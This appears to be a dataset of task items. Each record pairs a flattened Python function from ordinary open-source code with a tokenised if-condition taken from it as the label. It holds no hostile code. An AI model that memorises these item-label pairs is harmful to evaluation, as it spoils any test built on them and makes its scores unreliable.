{"input": "def locked_deps(package, poetry): reqs = [] packages = poetry.locker.locked_repository(False).packages for p in packages: dep = p.to_dependency() line = \"{}=={}\".format(p.name, p.version) requirement = dep.to_pep_508() if \";\" in requirement: line += \"; {}\".format(requirement.split(\";\")[1].strip()) reqs.append(line) return reqs, defaultdict(list)", "label": "if \";\" in requirement :"}
{"input": "def _paste_columns(self, topleft_corner, columns): starting_column = topleft_corner[1] number_of_columns = self.number_of_columns() for index, column in enumerate(columns): set_index = starting_column + index if set_index < number_of_columns: self.set_column_at(set_index, column, starting=topleft_corner[0]) else: real_column = [constants.DEFAULT_NA] * topleft_corner[0] real_column += column self.extend_columns([real_column]) self.__width, self.__array = uniform(self.__array)", "label": "if set_index < number_of_columns :"}
{"input": "def check_objects_exist(self, compare_id, raise_exc=True): for uid in convert_compare_id_to_list(compare_id): if not self.existence_quick_check(uid): if raise_exc: raise FactCompareException(\"{} not found in database\".format(uid)) return True return False", "label": "if raise_exc :"}
{"input": "def __add__(self, other): if hasattr(other, \"unit_type\"): if other.unit_type != self.unit_type: raise UnitError(\"Adding different types of units is\" \" not allowed\") if other.unit != self.unit: other = other.to(self.unit) return self.__class__( np.array(self) + np.array(other), unit_type=self.unit_type, unit=self.unit )", "label": "if other . unit_type != self . unit_type :"}
{"input": "def extract(self, tar): max_nb = maxNbFile(self) for index, field in enumerate(tar.array(\"file\")): if max_nb is not None and max_nb <= index: self.warning( \"TAR archive contains many files, but only first %s files are processed\" % max_nb ) break meta = Metadata(self) self.extractFile(field, meta) if meta.has(\"filename\"): title = _('File \"%s\"') % meta.getText(\"filename\") else: title = _(\"File\") self.addGroup(field.name, meta, title)", "label": "if max_nb is not None and max_nb <= index :"}
{"input": "def task_management_menu(activation, request): \"\"\"Available tasks actions.\"\"\" actions = [] if request.user.has_perm(activation.flow_class._meta.manage_permission_name): for transition in activation.get_available_transitions(): if transition.can_proceed(activation): url = activation.flow_task.get_task_url( activation.task, transition.name, user=request.user, namespace=request.resolver_match.namespace, ) if url: actions.append((transition.name.replace(\"_\", \" \").title(), url)) return {\"actions\": actions, \"request\": request}", "label": "if transition . can_proceed ( activation ) :"}
{"input": "def handle_default_mac_address(facts): for suffix in (\"\", \"_eth0\", \"_igb0\", \"_bnx0\", \"_bge0\", \"_nfo0\", \"_nge0\"): mac = facts.get(\"macaddress{}\".format(suffix)) if mac: try: result = MACAddressField.normalize(mac) except ValueError: continue if result[:6] in MAC_PREFIX_BLACKLIST: continue return result", "label": "if result [ : 6 ] in MAC_PREFIX_BLACKLIST :"}
{"input": "def run(self): consumer = KafkaConsumer( bootstrap_servers=\"localhost:9092\", auto_offset_reset=\"earliest\" ) consumer.subscribe([\"my-topic\"]) self.valid = 0 self.invalid = 0 for message in consumer: if len(message.value) == msg_size: self.valid += 1 else: self.invalid += 1 if consumer_stop.is_set(): break consumer.close()", "label": "if len ( message . value ) == msg_size :"}
{"input": "def createFields(self, fields): self.destroyFields() for name, label, args in fields: kwargs = dict(validator=_TransferValidator(name)) if args: kwargs.update(args) stxt = wx.StaticText(self, -1, label) txt = wx.TextCtrl(self, **kwargs) self._contentSizer.Add(stxt, 0, wx.ALIGN_CENTER_VERTICAL | wx.ALIGN_RIGHT) self._contentSizer.Add(txt, 0, wx.EXPAND) self.__dict__[name] = \"\" self._fields[name] = (stxt, txt)", "label": "if args :"}
{"input": "def poll_kafka(self): while True: val = self.do_poll() if val: yield self._emit(val) else: yield gen.sleep(self.poll_interval) if self.stopped: break self._close_consumer()", "label": "if self . stopped :"}
{"input": "def _generate_toc(line): while 1: if line.startswith(\"2\"): line = 5 while 1: if line: line = 6 break elif not line: line = 7 break elif not line: break return 1", "label": "if line :"}
{"input": "def find_script(scriptId_or_file_or_url): # sha = hashlib.sha1(scriptId_or_file_or_url.encode('utf-8')).hexdigest() for item in file_to_scriptId: if item[\"scriptId\"].lower() == scriptId_or_file_or_url.lower(): return item[\"file\"] if item[\"file\"].lower() == scriptId_or_file_or_url.lower(): return item[\"scriptId\"] if item[\"url\"].lower() == scriptId_or_file_or_url.lower(): return item[\"scriptId\"] return None", "label": "if item [ \"file\" ] . lower ( ) == scriptId_or_file_or_url . lower ( ) :"}
{"input": "def __get_impute_number(some_data): impute_num_list = None data_size = None for line in some_data: processed_data = line[1][0] index_list = line[1][1] if not data_size: data_size = len(processed_data) # data_size + 1, the last element of impute_num_list used to count the number of \"some_data\" impute_num_list = [0 for _ in range(data_size + 1)] impute_num_list[data_size] += 1 for index in index_list: impute_num_list[index] += 1 return np.array(impute_num_list)", "label": "if not data_size :"}
{"input": "def get_shipping_address(self): \"\"\"Returns Address object from shipping address fields if present\"\"\" # shipping address fields can be `shipping_address_name` or `shipping_address` # try getting value from both for fieldname in (\"shipping_address_name\", \"shipping_address\"): shipping_field = self.meta.get_field(fieldname) if shipping_field and shipping_field.fieldtype == \"Link\": if self.get(fieldname): return frappe.get_doc(\"Address\", self.get(fieldname)) return {}", "label": "if self . get ( fieldname ) :"}
{"input": "def _get_spawn_property(self, constraints, constraint_name, services): if services: # this isn't very nice if constraint_name == IMAGE_CONSTRAINT: return services[0].image elif constraint_name == CPUS_CONSTRAINT: return services[0].cpus for constraint in constraints: if constraint.name == constraint_name: return constraint.value return None", "label": "if constraint_name == IMAGE_CONSTRAINT :"}
{"input": "def latest_extra_data(self, extra_dirs=None): base_name = os.path.splitext(os.path.basename(self.file_name))[0] extra_dirs.append(self.board.GetPlotOptions().GetOutputDirectory()) file_dir_name = os.path.dirname(self.file_name) directories = [ file_dir_name, ] for dir in extra_dirs: if not os.path.isabs(dir): dir = os.path.join(file_dir_name, dir) if os.path.exists(dir): directories.append(dir) return find_latest_schematic_data(base_name, directories)", "label": "if os . path . exists ( dir ) :"}
{"input": "def _checkForLeftRightModifiers(cls, mod_state): mod_value = 0 mod_strs = [] for k, v in cls._OS_MODIFIERS: if mod_state & k > 0: mod_value += KeyboardConstants._modifierCodes.getID(v) mod_strs.append(modifier_name_mappings.get(v, \"MISSING_MOD_NAME\")) return mod_value, mod_strs", "label": "if mod_state & k > 0 :"}
{"input": "def _decode_pattern_list(data): rv = [] contains_dict = False for item in data: if isinstance(item, list): item = _decode_pattern_list(item) elif isinstance(item, dict): item = _decode_pattern_dict(item) contains_dict = True rv.append(item) # avoid sorting if any element in the list is a dict if not contains_dict: rv = sorted(rv) return rv", "label": "if isinstance ( item , list ) :"}
{"input": "def get_blob(self, blobname, ctlr=None, specific_dir=None): self._acquire_lock() try: dbsubpath = self._dbsubpath_from_blobname( blobname, ctlr=ctlr, specific_dir=specific_dir ) if dbsubpath is not None: return self.lang_zone.load_blob(dbsubpath) else: return None finally: self._release_lock()", "label": "if dbsubpath is not None :"}
{"input": "def get_tasks(self): for task in asyncio.all_tasks(loop=self.middleware.loop): formatted = None frame = None frames = [] for frame in task.get_stack(): cur_frame = get_frame_details(frame, self.logger) if cur_frame: frames.append(cur_frame) if frame: formatted = traceback.format_stack(frame) yield { \"stack\": formatted, \"frames\": frames, }", "label": "if frame :"}
{"input": "def main(args): optim = Adam({\"lr\": args.lr}) elbo = JitTrace_ELBO() if args.jit else Trace_ELBO() svi = SVI(model, guide, optim, loss=elbo) pyro.clear_param_store() for j in range(args.num_epochs): loss = svi.step(data) if j % 100 == 0: logging.info(\"[epoch %04d] loss: %.4f\" % (j + 1, loss)) for name, value in pyro.get_param_store().items(): logging.info(name) logging.info(value.detach().cpu().numpy())", "label": "if j % 100 == 0 :"}
{"input": "def create_var_list(scope, var_lists, shape): vars = [] for idx, v in enumerate(var_lists): name = \"{}_{}\".format(scope, idx) if shape is None: var = fluid.data(name, shape=v.shape) else: var = fluid.data(name, shape=shape + list(v[0].shape)) var.stop_gradient = False vars.append(var) return vars", "label": "if shape is None :"}
{"input": "def dr_relation(self, C, trans, nullable): dr_set = {} state, N = trans terms = [] g = self.lr0_goto(C[state], N) for p in g: if p.lr_index < p.len - 1: a = p.prod[p.lr_index + 1] if a in self.grammar.Terminals: if a not in terms: terms.append(a) # This extra bit is to handle the start state if state == 0 and N == self.grammar.Productions[0].prod[0]: terms.append(\"$end\") return terms", "label": "if a in self . grammar . Terminals :"}
{"input": "def get_field_values(self, fields): field_values = [] for field in fields: # Title is special case if field == \"title\": value = self.get_title_display() elif field == \"country\": try: value = self.country.printable_name except exceptions.ObjectDoesNotExist: value = \"\" elif field == \"salutation\": value = self.salutation else: value = getattr(self, field) field_values.append(value) return field_values", "label": "if field == \"title\" :"}
{"input": "def run(self, event, lambda_context): self.setup_exec_environment(event) resource_sets = self.get_resource_sets(event) result_sets = {} for (account_id, region), rarns in resource_sets.items(): self.assume_member({\"account\": account_id, \"region\": region}) resources = self.resolve_resources(event) rset = result_sets.setdefault((account_id, region), []) if resources: rset.extend(self.run_resource_set(event, resources)) return result_sets", "label": "if resources :"}
{"input": "def read(self, sock): data = self.sock.recv(64 * 1024) ready_to_read, ready_to_write, in_error = select.select( [self.sock], [], [], self.timeout ) while len(ready_to_read) == 1: more_data = self.sock.recv(64 * 1024) if len(more_data) == 0: break data = data + more_data ready_to_read, ready_to_write, in_error = select.select( [self.sock], [], [], self.timeout ) return data", "label": "if len ( more_data ) == 0 :"}
{"input": "def _check_ids(el, filename, parent_id): \"\"\"Recursively walks through tree and check if every object has ID\"\"\" for child in el: if child.tag == \"object\": msg = \"Widget has no ID in %s; class %s; Parent id: %s\" % ( filename, child.attrib[\"class\"], parent_id, ) assert \"id\" in child.attrib and child.attrib[\"id\"], msg for subel in child: if subel.tag == \"child\": _check_ids(subel, filename, child.attrib[\"id\"])", "label": "if child . tag == \"object\" :"}
{"input": "def get(self, request, *args, **kwargs): url = self.get_redirect_url(**kwargs) if url: if self.permanent: return http.HttpResponsePermanentRedirect(url) else: return http.HttpResponseRedirect(url) else: logger.warning( \"Gone: %s\" % self.request.path, extra={\"status_code\": 410, \"request\": self.request}, ) return http.HttpResponseGone()", "label": "if self . permanent :"}
{"input": "def test_representation(self): # Test that the state space representation in the measurement error # case is correct for name in self.model.ssm.shapes.keys(): if name == \"obs\": pass elif name == \"obs_cov\": actual = self.results2.filter_results.obs_cov desired = np.diag(self.true_measurement_error_variances)[:, :, np.newaxis] assert_equal(actual, desired) else: assert_equal( getattr(self.results2.filter_results, name), getattr(self.results.filter_results, name), )", "label": "elif name == \"obs_cov\" :"}
{"input": "def process_formdata(self, valuelist): if valuelist: date_str = \" \".join(valuelist) if not date_str: self.data = None raise ValidationError(self.gettext(\"Please input a date/time value\")) parse_kwargs = self.parse_kwargs.copy() if \"default\" not in parse_kwargs: try: parse_kwargs[\"default\"] = self.default() except TypeError: parse_kwargs[\"default\"] = self.default try: self.data = parser.parse(date_str, **parse_kwargs) except ValueError: self.data = None raise ValidationError(self.gettext(\"Invalid date/time input\"))", "label": "if not date_str :"}
{"input": "def get_bounding_box(self): for key in self.h5f[\"Data_Products\"].keys(): if key.startswith(\"VIIRS\") and key.endswith(\"GEO\"): lats = self.h5f[\"Data_Products\"][key][key + \"_Gran_0\"].attrs[ \"G-Ring_Latitude\" ] lons = self.h5f[\"Data_Products\"][key][key + \"_Gran_0\"].attrs[ \"G-Ring_Longitude\" ] break else: raise KeyError(\"Cannot find bounding coordinates!\") return lons.ravel(), lats.ravel()", "label": "if key . startswith ( \"VIIRS\" ) and key . endswith ( \"GEO\" ) :"}
{"input": "def _get_doc_contents(self, attr_name): value = getattr(self, attr_name) if isinstance(value, BasicCommand.FROM_FILE): if value.filename is not None: trailing_path = value.filename else: trailing_path = os.path.join(self.name, attr_name + \".rst\") root_module = value.root_module doc_path = os.path.join( os.path.abspath(os.path.dirname(root_module.__file__)), \"examples\", trailing_path, ) with _open(doc_path) as f: return f.read() else: return value", "label": "if value . filename is not None :"}
{"input": "def __truediv__(self, val): if isinstance(val, Vector3): if val.x == 0 or val.y == 0 or val.z == 0: raise ZeroDivisionError() gd_obj = lib.godot_vector3_operator_divide_vector(self._gd_ptr, val._gd_ptr) else: if val is 0: raise ZeroDivisionError() gd_obj = lib.godot_vector3_operator_divide_scalar(self._gd_ptr, val) return Vector3.build_from_gdobj(gd_obj)", "label": "if val is 0 :"}
{"input": "def _get_all_plugin_configs(self): with opentracing.global_tracer().start_active_span(\"_get_all_plugin_configs\"): if not hasattr(self, \"_plugin_configs\"): self._plugin_configs = { pc.identifier: pc for pc in PluginConfiguration.objects.all() } return self._plugin_configs", "label": "if not hasattr ( self , \"_plugin_configs\" ) :"}
{"input": "def msg(self, module, level, msg, *args, **kwargs): if self.level < level or level > len(LEVELS): return msg = str(msg).format(*args, **kwargs) with self.lock: self.output.write(FORMAT.format(module=module, level=LEVELS[level], msg=msg)) if hasattr(self.output, \"flush\"): self.output.flush()", "label": "if hasattr ( self . output , \"flush\" ) :"}
{"input": "def opentemplatefile(self, options, fulltemplatepath): \"\"\"Opens the template file (if required).\"\"\" if fulltemplatepath is not None: if os.path.isfile(fulltemplatepath): return open(fulltemplatepath, \"r\") else: self.warning(\"missing template file %s\" % fulltemplatepath) return None", "label": "if os . path . isfile ( fulltemplatepath ) :"}
{"input": "def b58(args, parser): for arg in args.input: blob, is_hex_input = parse_arg(arg, args.b) if is_hex_input: print(b2h(blob)) print(b2a_base58(blob)) print(b2a_hashed_base58(blob)) else: print(b2h(blob)) print(b2a_base58(blob)) try: blob = a2b_hashed_base58(arg) print(\"valid hashed b58\") print(\"contents: \", b2h(blob)) except Exception: print(\"not hashed b58\")", "label": "if is_hex_input :"}
{"input": "def edit_file(self, filename): import subprocess editor = self.get_editor() if self.env: environ = os.environ.copy() environ.update(self.env) else: environ = None try: c = subprocess.Popen( \"{} {}\".format(shlex_quote(editor), shlex_quote(filename)), env=environ, shell=True, ) exit_code = c.wait() if exit_code != 0: raise ClickException(\"{}: Editing failed!\".format(editor)) except OSError as e: raise ClickException(\"{}: Editing failed: {}\".format(editor, e))", "label": "if exit_code != 0 :"}
{"input": "def ascii85decode(data): n = b = 0 out = \"\" for c in data: if \"!\" <= c and c <= \"u\": n += 1 b = b * 85 + (ord(c) - 33) if n == 5: out += struct.pack(\">L\", b) n = b = 0 elif c == \"z\": assert n == 0 out += \"\\0\\0\\0\\0\" elif c == \"~\": if n: for _ in range(5 - n): b = b * 85 + 84 out += struct.pack(\">L\", b)[: n - 1] break return out", "label": "if \"!\" <= c and c <= \"u\" :"}
{"input": "def channel_to_netid(channel_name_or_id): try: channel = int(channel_name_or_id) except ValueError: netid = \"NETID_{}\".format(channel_name_or_id.upper()) if hasattr(ics, netid): channel = getattr(ics, netid) else: raise ValueError( \"channel must be an integer or \" \"a valid ICS channel name\" ) return channel", "label": "if hasattr ( ics , netid ) :"}
{"input": "def _find_this_and_next_frame(self, stack): for i in range(len(stack)): if stack[i].id == self._frame_id: if i == len(stack) - 1: # last frame return stack[i], None else: return stack[i], stack[i + 1] raise AssertionError(\"Frame doesn't exist anymore\")", "label": "if stack [ i ] . id == self . _frame_id :"}
{"input": "def nested_update(org_dict, upd_dict): for key, value in upd_dict.items(): if isinstance(value, dict): if key in org_dict: if not isinstance(org_dict[key], dict): raise ValueError( \"Mismatch between org_dict and upd_dict at node {}\".format(key) ) nested_update(org_dict[key], value) else: org_dict[key] = value else: org_dict[key] = value", "label": "if not isinstance ( org_dict [ key ] , dict ) :"}
{"input": "def __myreduce(self, elements): first = elements[0] for i in range(1, len(elements), 2): if elements[i] == \"and\": first = first and elements[i + 1] elif elements[i] == \"or\": first = first or elements[i + 1] self.stack = [] if isinstance(first, list): return [first] return first", "label": "if elements [ i ] == \"and\" :"}
{"input": "def test_to_json_na(self): # Set a value as nan and make sure it's written self.df.loc[self.df[\"BoroName\"] == \"Queens\", \"Shape_Area\"] = np.nan text = self.df.to_json() data = json.loads(text) self.assertTrue(len(data[\"features\"]) == 5) for f in data[\"features\"]: props = f[\"properties\"] self.assertEqual(len(props), 4) if props[\"BoroName\"] == \"Queens\": self.assertTrue(props[\"Shape_Area\"] is None)", "label": "if props [ \"BoroName\" ] == \"Queens\" :"}
{"input": "def process(self, resources): resources = self.filter_resources(resources, \"TableStatus\", self.valid_status) if not len(resources): return futures = [] client = local_session(self.manager.session_factory).client(\"dynamodb\") with self.executor_factory(max_workers=2) as w: for table_set in chunks(resources, 20): futures.append(w.submit(self.delete_table, client, table_set)) for f in as_completed(futures): if f.exception(): self.log.error( \"Exception deleting dynamodb table set \\n %s\" % (f.exception()) )", "label": "if f . exception ( ) :"}
{"input": "def skip_loss_scaling(self, backend_config=None): if self.loss_scaling is not False: if self.dtype != numpy.float16: msg = \"loss_scaling is tested when dtype is float16.\" return True, msg if backend_config is not None and not backend_config.use_cuda: msg = \"loss_scaling is tested when use_cuda is True.\" return True, msg return False, None", "label": "if self . dtype != numpy . float16 :"}
{"input": "def writeLibraryControllers(fp, human, meshes, skel, config, shapes=None): progress = Progress(len(meshes), None) fp.write(\"\\n <library_controllers>\\n\") for mIdx, mesh in enumerate(meshes): subprog = Progress()(0, 0.5) if skel: writeSkinController(fp, human, mesh, skel, config) subprog(0.5, 1) if shapes is not None: writeMorphController(fp, mesh, shapes[mIdx], config) progress.step() fp.write(\" </library_controllers>\\n\")", "label": "if shapes is not None :"}
{"input": "def doit(): recipes_path = expanduser(\"recipes.pprint\") recipe_dicts = eval(open(recipes_path).read()) for r in recipe_dicts: for key in r.keys(): if key not in (\"desc\", \"comments\"): del r[key] for c in r[\"comments\"]: for key in c.keys(): if key not in (\"comment\", \"title\"): del c[key] f = open(\"stripped.pprint\", \"w\") f.write(pformat(recipe_dicts)) f.close()", "label": "if key not in ( \"desc\" , \"comments\" ) :"}
{"input": "def _dispatchBubblingEvent(self, tag, evtType, evtObject): for node in tag.parents: if node is None: # pragma: no cover break if not node._listeners: continue if evtObject._stoppedPropagation: # pragma: no cover continue capture_listeners, bubbling_listeners = self._get_listeners( node, evtType ) # pylint:disable=unused-variable for c in bubbling_listeners: evtObject.currentTarget = node._node self.do_dispatch(c, evtObject)", "label": "if node is None :"}
{"input": "def connect(self): if self.session is None: self.session = requests.Session() if isinstance(self.verify, six.string_types): self.session.mount(\"httpsds8k://\", requests.adapters.HTTPAdapter()) else: self.session.mount(\"https://\", requests.adapters.HTTPAdapter()) self.session.verify = self.verify", "label": "if isinstance ( self . verify , six . string_types ) :"}
{"input": "def get_latest_tasks(cls, tasks): tasks_group = {} for task in tasks: task_key = cls.task_key( task_id=task.f_task_id, role=task.f_role, party_id=task.f_party_id ) if task_key not in tasks_group: tasks_group[task_key] = task elif task.f_task_version > tasks_group[task_key].f_task_version: # update new version task tasks_group[task_key] = task return tasks_group", "label": "elif task . f_task_version > tasks_group [ task_key ] . f_task_version :"}
{"input": "def wrapper(cached=True, reset=False): nonlocal cached_venv_dir if not cached or not cached_venv_dir or reset: venv_dir = os.environ.get(\"_VENV_DIR_\") or load_settings(lazy=True).get( \"venv_dir\" ) if venv_dir: # no cov if venv_dir == \"isolated\": venv_dir = VENV_DIR_ISOLATED elif venv_dir == \"shared\": venv_dir = VENV_DIR_SHARED else: # no cov venv_dir = VENV_DIR_SHARED cached_venv_dir = venv_dir return cached_venv_dir", "label": "if venv_dir == \"isolated\" :"}
{"input": "def __walk_dir_tree(self, dirname): dir_list = [] self.__logger.debug(\"__walk_dir_tree. START dir=%s\", dirname) for f in os.listdir(dirname): current = os.path.join(dirname, f) if os.path.isfile(current) and f.endswith(\"py\"): if self.module_registrant: self._load_py_from_file(current) dir_list.append(current) elif os.path.isdir(current): ret = self.__walk_dir_tree(current) if ret: dir_list.append((f, ret)) return dir_list", "label": "if ret :"}
{"input": "def read_ansible_config(project_path, variables_of_interest): fnames = [\"/etc/ansible/ansible.cfg\"] if project_path: fnames.append(os.path.join(project_path, \"ansible.cfg\")) values = {} try: parser = ConfigParser() parser.read(fnames) if \"defaults\" in parser: for var in variables_of_interest: if var in parser[\"defaults\"]: values[var] = parser[\"defaults\"][var] except Exception: logger.exception(\"Failed to read ansible configuration(s) {}\".format(fnames)) return values", "label": "if \"defaults\" in parser :"}
{"input": "def inference(self, x_all, data_loader): for i in range(len(self.convs)): output = [] for src_id, edge_index, size in data_loader: x = x_all[src_id].to(self.device) edge_index = edge_index.to(self.device) x = self.convs[i](x, edge_index) x = x[: size[1]] if i != self.num_layers - 1: x = F.relu(x) output.append(x.cpu()) x_all = torch.cat(output, dim=0) return F.log_softmax(x_all, dim=-1)", "label": "if i != self . num_layers - 1 :"}
{"input": "def guard_transform(transform): \"\"\"Return an Affine transformation instance.\"\"\" if not isinstance(transform, Affine): if tastes_like_gdal(transform): raise TypeError( \"GDAL-style transforms have been deprecated. This \" \"exception will be raised for a period of time to highlight \" \"potentially confusing errors, but will eventually be removed.\" ) else: transform = Affine(*transform) return transform", "label": "if tastes_like_gdal ( transform ) :"}
{"input": "def _tokenize(self, text): if tf.is_tensor(text): rank = len(text.shape) if rank == 0: return self._tokenize_tensor(text) elif rank == 1: return self._tokenize_batch_tensor(text) else: raise ValueError(\"Unsupported tensor rank %d for tokenization\" % rank) elif isinstance(text, list): return list(map(self.tokenize, text)) else: text = tf.compat.as_text(text) return self._tokenize_string(text)", "label": "if rank == 0 :"}
{"input": "def validate_export(namespace): destination = namespace.destination if destination == \"file\": if namespace.path is None or namespace.format_ is None: raise CLIError(\"usage error: --path PATH --format FORMAT\") elif destination == \"appconfig\": if (namespace.dest_name is None) and (namespace.dest_connection_string is None): raise CLIError(\"usage error: --config-name NAME | --connection-string STR\") elif destination == \"appservice\": if namespace.appservice_account is None: raise CLIError(\"usage error: --appservice-account NAME_OR_ID\")", "label": "if ( namespace . dest_name is None ) and ( namespace . dest_connection_string is None ) :"}
{"input": "def dispatch(self, request, *args, **kwargs): settings = self.get_settings(self.form_class.settings) initial = self.get_initial_form_data(settings) form = self.form_class(request=request, initial=initial) if request.method == \"POST\": form = self.form_class( request.POST, request.FILES, request=request, initial=initial ) if form.is_valid(): form.save(settings) messages.success(request, _(\"Settings have been saved.\")) return redirect(request.path_info) return self.render(request, {\"form\": form, \"form_settings\": settings})", "label": "if form . is_valid ( ) :"}
{"input": "def get_modules(path): modules = set() for dirpath, dirnames, filenames in os.walk(path): for filename in filenames: if filename.endswith(\".py\"): cutoff = len(path) + 1 fullpath = os.path.join(dirpath[cutoff:], filename) modules.add(fullpath) return modules", "label": "if filename . endswith ( \".py\" ) :"}
{"input": "def _make_input_layers(self, rebuild=False): for name, layer in self.layer_map.items(): layer.left_in_edges = len(layer.in_edges) if len(layer.in_edges) == 0: if rebuild: if not layer.get_attr(\"scope\"): self.input_layers.append(name) else: self.input_layers.append(name)", "label": "if not layer . get_attr ( \"scope\" ) :"}
{"input": "def _get_status(self): connection_errors_allowed = 10 while True: try: content = requests.get(self.__status_details_url).json() except (requests.ConnectionError, requests.HTTPError) as e: if not connection_errors_allowed: yield e content = {\"processed\": False, \"code\": \"being_processed\"} connection_errors_allowed -= 1 yield content", "label": "if not connection_errors_allowed :"}
{"input": "def show(self): if len(self.figures.keys()) == 0: return if not SETTINGS.plot_split: if SETTINGS.plot_backend.lower() == \"qt4agg\": self.tabbed_qt4_window() elif SETTINGS.plot_backend.lower() == \"qt5agg\": self.tabbed_qt5_window() elif SETTINGS.plot_backend.lower() == \"tkagg\": self.tabbed_tk_window() else: plt.show() else: plt.show()", "label": "elif SETTINGS . plot_backend . lower ( ) == \"qt5agg\" :"}
{"input": "def emit(self, record): msg = self.format(record) self.lock.acquire() try: msg = self.encode(msg) if self.should_rollover(record, len(msg)): self.perform_rollover() self.write(msg) self.flush() finally: self.lock.release()", "label": "if self . should_rollover ( record , len ( msg ) ) :"}
{"input": "def install(self, unicode=False, names=None): import __builtin__ __builtin__.__dict__[\"_\"] = unicode and self.ugettext or self.gettext if hasattr(names, \"__contains__\"): if \"gettext\" in names: __builtin__.__dict__[\"gettext\"] = __builtin__.__dict__[\"_\"] if \"ngettext\" in names: __builtin__.__dict__[\"ngettext\"] = ( unicode and self.ungettext or self.ngettext ) if \"lgettext\" in names: __builtin__.__dict__[\"lgettext\"] = self.lgettext if \"lngettext\" in names: __builtin__.__dict__[\"lngettext\"] = self.lngettext", "label": "if \"gettext\" in names :"}
{"input": "def test_simulate_moment_steps_set_state(dtype): q0, q1 = cirq.LineQubit.range(2) circuit = cirq.Circuit(cirq.H(q0), cirq.H(q1), cirq.H(q0), cirq.H(q1)) simulator = cirq.Simulator(dtype=dtype) for i, step in enumerate(simulator.simulate_moment_steps(circuit)): np.testing.assert_almost_equal(step.state_vector(), np.array([0.5] * 4)) if i == 0: step.set_state_vector(np.array([1, 0, 0, 0], dtype=dtype))", "label": "if i == 0 :"}
{"input": "def get_config_settings(): config = {} for plugin in extension_loader.MANAGER.plugins: fn_name = plugin.name function = plugin.plugin # if a function takes config... if hasattr(function, \"_takes_config\"): fn_module = importlib.import_module(function.__module__) # call the config generator if it exists if hasattr(fn_module, \"gen_config\"): config[fn_name] = fn_module.gen_config(function._takes_config) return yaml.safe_dump(config, default_flow_style=False)", "label": "if hasattr ( function , \"_takes_config\" ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_app_id(d.getPrefixedString()) continue if tt == 18: self.set_queue_name(d.getPrefixedString()) continue if tt == 24: self.set_pause(d.getBoolean()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def enable(self): \"\"\"enable the patch.\"\"\" for patch in self.dependencies: patch.enable() if not self.enabled: pyv = sys.version_info[0] if pyv == 2: if self.PY2 == SKIP: return # skip patch activation if not self.PY2: raise IncompatiblePatch(\"Python 2 not supported!\") if pyv == 3: if self.PY3 == SKIP: return # skip patch activation if not self.PY3: raise IncompatiblePatch(\"Python 3 not supported!\") self.pre_enable() self.do_enable() self.enabled = True", "label": "if self . PY2 == SKIP :"}
{"input": "def to_dict(self) -> JSONDict: data = dict() for key in iter(self.__dict__): if key == \"bot\" or key.startswith(\"_\"): continue value = self.__dict__[key] if value is not None: if hasattr(value, \"to_dict\"): data[key] = value.to_dict() else: data[key] = value if data.get(\"from_user\"): data[\"from\"] = data.pop(\"from_user\", None) return data", "label": "if value is not None :"}
{"input": "def _resolve_result(self, f=None): try: if f: results = f.result() else: results = list(map(self._client.results.get, self.msg_ids)) if self._single_result: r = results[0] if isinstance(r, Exception): raise r else: results = error.collect_exceptions(results, self._fname) self._success = True self.set_result(self._reconstruct_result(results)) except Exception as e: self._success = False self.set_exception(e)", "label": "if isinstance ( r , Exception ) :"}
{"input": "def print_monitor(args): from pylearn2.utils import serial import gc for model_path in args: if len(args) > 1: print(model_path) model = serial.load(model_path) monitor = model.monitor del model gc.collect() channels = monitor.channels if not hasattr(monitor, \"_epochs_seen\"): print(\"old file, not all fields parsed correctly\") else: print(\"epochs seen: \", monitor._epochs_seen) print(\"time trained: \", max(channels[key].time_record[-1] for key in channels)) for key in sorted(channels.keys()): print(key, \":\", channels[key].val_record[-1])", "label": "if not hasattr ( monitor , \"_epochs_seen\" ) :"}
{"input": "def apply(self, **kwargs: Any) -> None: for node in self.document.traverse(addnodes.index): if \"entries\" in node and any(len(entry) == 4 for entry in node[\"entries\"]): msg = ( __( \"4 column based index found. \" \"It might be a bug of extensions you use: %r\" ) % node[\"entries\"] ) logger.warning(msg, location=node) for i, entry in enumerate(node[\"entries\"]): if len(entry) == 4: node[\"entries\"][i] = entry + (None,)", "label": "if \"entries\" in node and any ( len ( entry ) == 4 for entry in node [ \"entries\" ] ) :"}
{"input": "def cleanup_empty_directories(path: str): \"\"\"Remove all empty folders inside (and including) 'path'\"\"\" path = os.path.normpath(path) while 1: repeat = False for root, dirs, files in os.walk(path, topdown=False): if not dirs and not files and root != path: try: remove_dir(root) repeat = True except: pass if not repeat: break # Only remove if main folder is now also empty if not os.listdir(path): try: remove_dir(path) except: pass", "label": "if not dirs and not files and root != path :"}
{"input": "def expect_flow_sequence_item(self): if isinstance(self.event, SequenceEndEvent): self.indent = self.indents.pop() self.flow_level -= 1 if self.canonical: self.write_indicator(u\",\", False) self.write_indent() self.write_indicator(u\"]\", False) self.state = self.states.pop() else: self.write_indicator(u\",\", False) if self.canonical or self.column > self.best_width: self.write_indent() self.states.append(self.expect_flow_sequence_item) self.expect_node(sequence=True)", "label": "if self . canonical :"}
{"input": "def test_loss_diff(self): losses = [] for use_cuda in [True, False]: for use_py_func_op in [True, False]: L = test_main(use_cuda, use_py_func_op, self.use_parallel_executor) if L is not None: losses.append(L) for idx in six.moves.range(len(losses) - 1): max_diff = np.max(np.abs(losses[idx] - losses[0])) self.assertAlmostEqual(max_diff, 0, delta=1e-3)", "label": "if L is not None :"}
{"input": "def check_file(f, path): if not (ignore_substring and ignore_substring in f): if substring in f: compl_path = os.path.join(path, f) if os.path.isfile(compl_path): return compl_path return False", "label": "if os . path . isfile ( compl_path ) :"}
{"input": "def is_valid_block(self): \"\"\"check wheter the block is valid in the current position\"\"\" for i in range(self.block.x): for j in range(self.block.x): if self.block.get(i, j): if self.block.pos.x + i < 0: return False if self.block.pos.x + i >= COLUMNS: return False if self.block.pos.y + j < 0: return False if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False): return False return True", "label": "if self . block . pos . x + i < 0 :"}
{"input": "def is_fail_state(state): if type( state.addr ) == SootAddressDescriptor and state.addr.method == SootMethodDescriptor.from_soot_method( onclick_method ): sols = state.solver.eval_upto(state.memory_soot.stack.load(\"$z0\"), 2) assert len(sols) == 1 if sols[0] == 0: return True return False", "label": "if sols [ 0 ] == 0 :"}
